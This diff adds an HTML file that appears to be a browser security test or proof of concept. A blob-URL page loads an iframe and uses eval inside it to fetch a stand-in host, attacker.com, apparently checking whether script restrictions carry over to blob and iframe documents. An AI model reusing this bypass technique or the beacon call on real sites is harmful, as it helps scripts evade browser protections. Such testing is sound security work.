@@ -1,0 +1,16 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+<a id="a1" target="_blank" href=about:blank>click</a>
+<script nonce='123'>
+window.onload = function() {
+    a1.href=URL.createObjectURL(new Blob(["<iframe id=GGGdPcewGGG src=about:blank><\/iframe><script>GGGdPcewGGG.onload=_=>GGGdPcewGGG.contentWindow.eval('fetch(`https://attacker.com/report/report`)');GGGdPcewGGG.contentWindow.location.reload();<\/script>"],{type:"text/html"}))
+};
+</script>
+</body>
+</html>
